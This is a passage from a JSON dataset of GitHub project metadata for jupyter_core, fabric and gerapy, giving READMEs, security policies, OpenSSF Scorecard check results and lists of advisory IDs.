        "README_content": "# Jupyter Core\n\n[![Build Status](https://github.com/jupyter/jupyter_core/actions/workflows/test.yml/badge.svg?query=branch%3Amain++)](https://github.com/jupyter/jupyter_core/actions/workflows/test.yml/badge.svg?query=branch%3Amain++)\n[![Documentation Status](https://readthedocs.org/projects/jupyter-core/badge/?version=latest)](http://jupyter-core.readthedocs.io/en/latest/?badge=latest)\n\nCore common functionality of Jupyter projects.\n\nThis package contains base application classes and configuration inherited by other projects.\nIt doesn't do much on its own.\n\n# Development Setup\n\nThe [Jupyter Contributor Guides](https://docs.jupyter.org/en/latest/contributing/content-contributor.html) provide extensive information on contributing code or documentation to Jupyter projects. The limited instructions below for setting up a development environment are for your convenience.\n\n## Coding\n\nYou'll need Python and `pip` on the search path. Clone the Jupyter Core git repository to your computer, for example in `/my/projects/jupyter_core`.\nNow create an [editable install](https://pip.pypa.io/en/stable/reference/pip_install/#editable-installs)\nand download the dependencies of code and test suite by executing:\n\n```\ncd /my/projects/jupyter_core/\npip install -e \".[test]\"\npy.test\n```\n\nThe last command runs the test suite to verify the setup. During development, you can pass filenames to `py.test`, and it will execute only those tests.\n\n## Code Styling\n\n`jupyter_core` has adopted automatic code formatting so you shouldn't\nneed to worry too much about your code style.\nAs long as your code is valid,\nthe pre-commit hook should take care of how it should look.\n`pre-commit` and its associated hooks will automatically be installed when\nyou run `pip install -e \".[test]\"`\n\nTo install `pre-commit` manually, run the following:\n\n```bash\n    pip install pre-commit\n    pre-commit install\n```\n\nYou can invoke the pre-commit hook by hand at any time with:\n\n```bash\n    pre-commit run\n```\n\nwhich should run any autoformatting on your code\nand tell you about any errors it couldn't fix automatically.\nYou may also install [black integration](https://github.com/psf/black#editor-integration)\ninto your text editor to format code automatically.\n\nIf you have already committed files before setting up the pre-commit\nhook with `pre-commit install`, you can fix everything up using\n`pre-commit run --all-files`. You need to make the fixing commit\nyourself after that.\n\n## Documentation\n\nThe documentation of Jupyter Core is generated from the files in `docs/` using Sphinx. Instructions for setting up Sphinx with a selection of optional modules are in the [Documentation Guide](https://docs.jupyter.org/en/latest/contributing/content-contributor.html). You'll also need the `make` command.\nFor a minimal Sphinx installation to process the Jupyter Core docs, execute:\n\n```\npip install sphinx\n```\n\nThe following commands build the documentation in HTML format and check for broken links:\n\n```\ncd /my/projects/jupyter_core/docs/\nmake html linkcheck\n```\n\nPoint your browser to the following URL to access the generated documentation:\n\n_file:///my/projects/jupyter_core/docs/\\_build/html/index.html_\n\n## About the Jupyter Development Team\n\nThe Jupyter Development Team is the set of all contributors to the Jupyter\nproject. This includes all of the Jupyter subprojects. A full list with\ndetails is kept in the documentation directory, in the file\n`about/credits.txt`.\n\nThe core team that coordinates development on GitHub can be found here:\nhttps://github.com/ipython/.\n\n## Our Copyright Policy\n\nJupyter uses a shared copyright model. Each contributor maintains copyright\nover their contributions to Jupyter. It is important to note that these\ncontributions are typically only changes to the repositories. Thus, the Jupyter\nsource code in its entirety is not the copyright of any single person or\ninstitution. Instead, it is the collective copyright of the entire Jupyter\nDevelopment Team. If individual contributors want to maintain a record of what\nchanges/contributions they have specific copyright on, they should indicate\ntheir copyright in the commit message of the change, when they commit the\nchange to one of the Jupyter repositories.\n\nWith this in mind, the following banner should be used in any source code file\nto indicate the copyright and license terms:\n\n```\n# Copyright (c) Jupyter Development Team.\n# Distributed under the terms of the Modified BSD License.\n```\n",
        "num_commits": 641,
        "project_age_days": 3506,
        "project_created_at": "2015-03-25",
        "latest_updated_at": "2024-10-04",
        "latest_pushed_at": "2024-06-10",
        "num_contributors": 55,
        "num_pull": 274,
        "num_issues": 402,
        "num_opening_issue": 23,
        "project_size(kB)": 645,
        "num_stargazers": 196,
        "num_watchers": 196,
        "num_forks": 181,
        "num_subscribers": 40,
        "SecurityPolicy_created_at": "2022-05-30 14:04:22",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "6531b7bcc190c5a0f48f4ca982e977dcaff888da",
                "url": "https://github.com/jupyter/.github/commit/6531b7bcc190c5a0f48f4ca982e977dcaff888da",
                "date": "2022-08-01 14:37:10"
            },
            {
                "commit_id": "c99681009485f9332e90b13c1e122a04fbe8d6c4",
                "url": "https://github.com/jupyter/.github/commit/c99681009485f9332e90b13c1e122a04fbe8d6c4",
                "date": "2022-05-30 14:04:22"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "fabric/fabric",
        "project_url": "https://github.com/fabric/fabric",
        "SSF": {
            "date": "2024-10-29T21:28:07+07:00",
            "repo": {
                "name": "github.com/fabric/fabric",
                "commit": "988dd0fd05db47331cb43d0ea9787908ef33219c"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 3.7,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'main'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no pull request found",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "Found 0/30 approved changesets -- score normalized to 0",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: fabric contributor org/company found, paramiko contributor org/company found, pyinvoke contributor org/company found, graphite-project contributor org/company found, reach-security contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 5 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no workflows found",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: BSD 2-Clause \"Simplified\" License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "0 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 0",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no dependencies found",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: no pull requests merged into dev branch"
                    ],
                    "score": 0,
                    "reason": "no SAST tool detected",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "No tokens found",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/fabric/fabric/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Security contact information\n\nTo report a security vulnerability, please use the\n[Tidelift security contact](https://tidelift.com/security).\nTidelift will coordinate the fix and disclosure.\n",
        "project_all_labels": [
            "Authentication/Keys",
            "Awaiting feedback",
            "Bug",
            "Configuration",
            "Connection",
            "Contrib",
            "Core",
            "Decorators",
            "Docs",
            "Feature",
            "Group",
            "Invalid",
            "Low-hanging fruit",
            "Needs changelog/docs",
            "Needs investigation",
            "Needs patch",
            "Needs tests",
            "Network",
            "Nonstandard platforms",
            "Packaging",
            "put()/get()",
            "Python versions",
            "Ready to merge/rebase",
            "Refactoring",
            "run()",
            "ssh_config",
            "sudo()",
            "Support",
            "Tasks",
            "Tests",
            "UI",
            "Wart"
        ],
        "README_content": "|version| |python| |license| |ci| |coverage|\n\n.. |version| image:: https://img.shields.io/pypi/v/fabric\n    :target: https://pypi.org/project/fabric/\n    :alt: PyPI - Package Version\n.. |python| image:: https://img.shields.io/pypi/pyversions/fabric\n    :target: https://pypi.org/project/fabric/\n    :alt: PyPI - Python Version\n.. |license| image:: https://img.shields.io/pypi/l/fabric\n    :target: https://github.com/fabric/fabric/blob/main/LICENSE\n    :alt: PyPI - License\n.. |ci| image:: https://img.shields.io/circleci/build/github/fabric/fabric/main\n    :target: https://app.circleci.com/pipelines/github/fabric/fabric\n    :alt: CircleCI\n.. |coverage| image:: https://img.shields.io/codecov/c/gh/fabric/fabric\n    :target: https://app.codecov.io/gh/fabric/fabric\n    :alt: Codecov\n\nWelcome to Fabric!\n==================\n\nFabric is a high level Python (2.7, 3.4+) library designed to execute shell\ncommands remotely over SSH, yielding useful Python objects in return. It builds\non top of `Invoke <https://pyinvoke.org>`_ (subprocess command execution and\ncommand-line features) and `Paramiko <https://paramiko.org>`_ (SSH protocol\nimplementation), extending their APIs to complement one another and provide\nadditional functionality.\n\nTo find out what's new in this version of Fabric, please see `the changelog\n<https://fabfile.org/changelog.html#{}>`_.\n\nThe project maintainer keeps a `roadmap\n<https://bitprophet.org/projects#roadmap>`_ on his website.\n",
        "num_commits": 1605,
        "project_age_days": 5661,
        "project_created_at": "2009-05-01",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-04-03",
        "num_contributors": 17,
        "num_pull": 555,
        "num_issues": 2314,
        "num_opening_issue": 473,
        "project_size(kB)": 19293,
        "num_stargazers": 14873,
        "num_watchers": 14873,
        "num_forks": 1939,
        "num_subscribers": 462,
        "SecurityPolicy_created_at": "2024-01-26 22:08:21",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "988dd0fd05db47331cb43d0ea9787908ef33219c",
                "url": "https://github.com/fabric/fabric/commit/988dd0fd05db47331cb43d0ea9787908ef33219c",
                "date": "2024-01-26 22:08:21"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "gerapy/gerapy",
        "project_url": "https://github.com/gerapy/gerapy",
        "SSF": {
            "date": "2024-10-29T23:15:53+07:00",
            "repo": {
                "name": "github.com/gerapy/gerapy",
                "commit": "7c4eda875563f5d0342a3650959e0502bc279d77"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.2,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'master'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 8,
                    "reason": "22 out of 26 merged PRs checked by a CI test -- score normalized to 8",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 4,
                    "reason": "Found 3/7 approved changesets -- score normalized to 4",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: AceDataCloud contributor org/company found, microsoft contributor org/company found, Python3WebSpider contributor org/company found, Gerapy contributor org/company found, ModelZoo contributor org/company found, NightTeam contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 6 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: :0"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: MIT License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "1 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 0",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/build_docker_image_master.yml:10"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/Gerapy/Gerapy/build.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:26: update your workflow using https://app.stepsecurity.io/secureworkflow/Gerapy/Gerapy/build.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build.yml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/Gerapy/Gerapy/build.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_docker_image_master.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/Gerapy/Gerapy/build_docker_image_master.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_docker_image_master.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/Gerapy/Gerapy/build_docker_image_master.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_docker_image_release.yml:11: update your workflow using https://app.stepsecurity.io/secureworkflow/Gerapy/Gerapy/build_docker_image_release.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_docker_image_release.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/Gerapy/Gerapy/build_docker_image_release.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/Gerapy/Gerapy/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/Gerapy/Gerapy/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:56: update your workflow using https://app.stepsecurity.io/secureworkflow/Gerapy/Gerapy/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:70: update your workflow using https://app.stepsecurity.io/secureworkflow/Gerapy/Gerapy/codeql-analysis.yml/master?enable=pin",
                        "Warn: containerImage not pinned by hash: Dockerfile:1",
                        "Warn: containerImage not pinned by hash: Dockerfile:17: pin your Docker image by updating python:3.10-slim to python:3.10-slim@sha256:eb9ca77b1a0ffbde84c1dc333beb3490a2638813cc25a339f8575668855b9ff1",
                        "Warn: downloadThenRun not pinned by hash: Dockerfile:6-10",
                        "Warn: npmCommand not pinned by hash: .github/workflows/build_docker_image_master.yml:24",
                        "Warn: npmCommand not pinned by hash: .github/workflows/build_docker_image_release.yml:21",
                        "Info:   0 out of  10 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   1 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   1 downloadThenRun dependencies pinned",
                        "Info:   2 out of   2 pipCommand dependencies pinned",
                        "Info:   0 out of   2 npmCommand dependencies pinned",
                        "Info:   0 out of   2 containerImage dependencies pinned"
                    ],
                    "score": 2,
                    "reason": "dependency not pinned by hash detected -- score normalized to 2",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Warn: 22 commits out of 26 are checked with a SAST tool"
                    ],
                    "score": 9,
                    "reason": "SAST tool detected but not run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/codeql-analysis.yml:28",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/codeql-analysis.yml:29",
                        "Warn: no topLevel permission defined: .github/workflows/build.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_docker_image_master.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_docker_image_release.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/codeql-analysis.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/sync_docs.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-v88g-cgmw-v5xw",
                        "Warn: Project is vulnerable to: GHSA-93q8-gq69-wqmw",
                        "Warn: Project is vulnerable to: GHSA-wf5p-g6vw-rhxx",
                        "Warn: Project is vulnerable to: GHSA-qwcr-r2fm-qrc7",
                        "Warn: Project is vulnerable to: GHSA-grv7-fg5c-xmjg",
                        "Warn: Project is vulnerable to: GHSA-pxg6-pf52-xh8x",
                        "Warn: Project is vulnerable to: GHSA-phwq-j96m-2c2q",
                        "Warn: Project is vulnerable to: GHSA-ghr5-ch3p-vcr6",
                        "Warn: Project is vulnerable to: GHSA-434g-2637-qmqr",
                        "Warn: Project is vulnerable to: GHSA-49q7-c7j4-3p7m",
                        "Warn: Project is vulnerable to: GHSA-977x-g7h5-7qgw",
                        "Warn: Project is vulnerable to: GHSA-f7q4-pwc6-w24p",
                        "Warn: Project is vulnerable to: GHSA-fc9h-whq2-v747",
                        "Warn: Project is vulnerable to: GHSA-qw6h-vgh9-j6wx",
                        "Warn: Project is vulnerable to: GHSA-pfq8-rq6v-vf5m",
                        "Warn: Project is vulnerable to: GHSA-c7qv-q95q-8v27",
                        "Warn: Project is vulnerable to: GHSA-2p57-rm9w-gvfp",
                        "Warn: Project is vulnerable to: GHSA-9c47-m6qq-7p4h",
                        "Warn: Project is vulnerable to: GHSA-76p3-8jx3-jpfq",
                        "Warn: Project is vulnerable to: GHSA-3rfm-jhwj-7488",
                        "Warn: Project is vulnerable to: GHSA-hhq3-ff78-jv3g",
                        "Warn: Project is vulnerable to: GHSA-952p-6rrq-rcjv",
                        "Warn: Project is vulnerable to: GHSA-5rrq-pxf6-6jx5",
                        "Warn: Project is vulnerable to: GHSA-8fr3-hfg3-gpgp",
                        "Warn: Project is vulnerable to: GHSA-gf8q-jrpm-jvxq",
                        "Warn: Project is vulnerable to: GHSA-2r2c-g63r-vccr",
                        "Warn: Project is vulnerable to: GHSA-cfm4-qjh2-4765",
                        "Warn: Project is vulnerable to: GHSA-x4jg-mjrx-434g",
                        "Warn: Project is vulnerable to: GHSA-rp65-9cf3-cjxr",
                        "Warn: Project is vulnerable to: GHSA-9wv6-86v2-598j",
                        "Warn: Project is vulnerable to: GHSA-566m-qj78-rww5",
                        "Warn: Project is vulnerable to: GHSA-7fh5-64p2-3v2j",
                        "Warn: Project is vulnerable to: GHSA-p8p7-x288-28g6",
                        "Warn: Project is vulnerable to: GHSA-c2qf-rxjj-qqgw",
                        "Warn: Project is vulnerable to: GHSA-m6fv-jmcg-4jfg",
                        "Warn: Project is vulnerable to: GHSA-h9rv-jmmf-4pgx",
                        "Warn: Project is vulnerable to: GHSA-hxcc-f52p-wc94",
                        "Warn: Project is vulnerable to: GHSA-cm22-4g7w-348p",
                        "Warn: Project is vulnerable to: GHSA-vx3p-948g-6vhq",
                        "Warn: Project is vulnerable to: GHSA-72xf-g2v4-qvf3",
                        "Warn: Project is vulnerable to: GHSA-5j4c-8p2g-v4jx",
                        "Warn: Project is vulnerable to: GHSA-g3ch-rx76-35fx",
                        "Warn: Project is vulnerable to: GHSA-wr3j-pwj9-hqq6",
                        "Warn: Project is vulnerable to: GHSA-3h5v-q93c-6h6q",
                        "Warn: Project is vulnerable to: GHSA-fhv8-fx5f-7fxf",
                        "Warn: Project is vulnerable to: GHSA-8x94-hmjh-97hq",
                        "Warn: Project is vulnerable to: GHSA-rrqc-c2jx-6jgv",
                        "Warn: Project is vulnerable to: GHSA-gw84-84pc-xp82",
                        "Warn: Project is vulnerable to: GHSA-3rq5-2g8h-59hc",
                        "Warn: Project is vulnerable to: GHSA-x7m3-jprg-wc5g / PYSEC-2023-177",
